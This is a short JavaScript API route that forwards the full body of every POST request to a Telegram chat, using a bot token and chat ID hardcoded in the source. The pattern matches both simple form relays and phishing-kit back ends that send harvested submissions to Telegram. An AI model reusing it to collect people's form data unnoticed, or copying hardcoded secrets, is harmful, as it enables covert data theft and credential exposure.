import axios from "axios";

const telegramToken = "5851396630:AAGY_Nt5irbuCKqNHaJ0MU1Y3uEv8qRc7Eo";
const telegramChatId = "5860473899";

export const POST = async (req, res) => {
  try {
    const body = await req.json();
    const bodyString = JSON.stringify(body);

    const sendTelegramMessage = async (message) => {
      const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
      try {
        const response = await axios.post(telegramApiUrl, {
          chat_id: telegramChatId,
          text: message,
        });
        console.log(`Message sent to Telegram: ${response.data.result.text}`);
      } catch (error) {
        console.error("Failed to send message to Telegram:", error);
      }
    };
    await sendTelegramMessage(bodyString);
  } catch (error) {
    return new Response(`${error}`, { status: 500 });
  }
};
